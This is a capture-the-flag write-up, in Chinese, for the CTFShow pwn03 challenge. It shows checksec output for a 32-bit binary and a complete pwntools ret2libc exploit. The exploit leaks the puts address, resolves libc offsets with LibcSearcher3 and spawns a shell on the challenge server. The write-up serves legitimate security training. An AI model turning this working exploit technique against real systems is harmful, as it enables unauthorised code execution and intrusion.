---
title: CTFShow pwn03
layout: doc
---

# {{$frontmatter.title}}
[[toc]]

> 题目链接：https://ctf.show/challenges#pwn03-64

## 基础分析
```zsh
┌──(kali㉿kali)-[~/win/Downloads]
└─$ file stack1
stack1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=08a58e877a2014b776502c20922da10e059c93da, not stripped

┌──(kali㉿kali)-[~/win/Downloads]
└─$ checksec --file=stack1
[*] '/home/kali/win/Downloads/stack1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## ida

栈不可执行，栈溢出保护未开启
![alt text](/images/image-22.png)

![alt text](/images/image-23.png)

没有可写的bss 只能ret2libc了

## exp
> 运用LibcSearcher3
>
> https://github.com/Ro0tk1t/LibcSearcher3
```py
from pwn import *
from LibcSearcher3 import *

# io = process("./stack1")
elf = ELF("./stack1")
io = remote("pwn.challenge.ctf.show", 28119)
context(arch="i386", os="linux")

padding = 0x9 + 4

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pwnme_addr = 0x080484BB

payload = flat(["a" * padding, puts_plt, pwnme_addr, puts_got])
print(io.recvline())  # b'stack happy!\n'
print(io.recvline())  # b'32bits\n'
print(io.recvline())  # b '\n'

io.sendline(payload)
puts_real = u32(io.recv(4))
print("puts_real: " + hex(puts_real))

# 使用LibcSearcher3 获取 libc_base
# 本地libc和远端 不一样， 建议连上远端调试
obj = LibcSearcher("puts", puts_real)

libc_base = puts_real - obj.dump("puts")
system_addr = libc_base + obj.dump("system")
sh_addr = libc_base + obj.dump("str_bin_sh")

print(f"libc_base: {hex(libc_base)}")
print(f"system_addr: {hex(system_addr)}")
print(f"sh_addr: {hex(sh_addr)}")

payload = flat(["a" * padding, system_addr, 0xDEADBEEF, sh_addr])
io.sendline(payload)
io.interactive()

```

## LibcSearcher3 Usage
```py
from LibcSearcher3 import *

#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
obj = LibcSearcher("fgets", 0x7ff39014bd90)

obj = LibcSearcher("fgets", 0x7ff39014bd90) # 使用一个已知符号地址作为初始约束，初始化 LibcSearcher
obj.add_condition("atoi", 218528) # 添加一个约束条件

print("[+]/bin/sh offset: ", hex(obj.dump("str_bin_sh"))) # 根据已有约束条件，查询某个符号在 Libc 中的地址
print("[+]system  offset: ", hex(obj.dump("system")))
```